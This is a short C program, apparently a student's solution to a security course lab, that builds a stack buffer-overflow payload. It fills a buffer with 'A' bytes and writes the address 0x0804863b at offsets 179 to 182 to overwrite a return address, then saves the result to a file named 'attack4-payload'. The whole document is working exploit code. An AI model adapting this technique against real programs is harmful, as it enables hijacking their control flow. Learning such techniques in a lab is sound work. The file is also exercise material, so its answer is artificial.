#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util-program.h"


int main(int argc, char **argv)
{
    /* YOUR CODE: Generate buf appropriately */
	int buf_size=V4_SIZE+24;	
	char buf[buf_size];
	memset(buf,'A',buf_size);
	buf[179]=0x3b;
	buf[180]=0x86;
	buf[181]=0x04;
	buf[182]=0x08;
    write_to_file( "attack4-payload", buf , buf_size , FILE_CLEAR );
    exit(0);
}
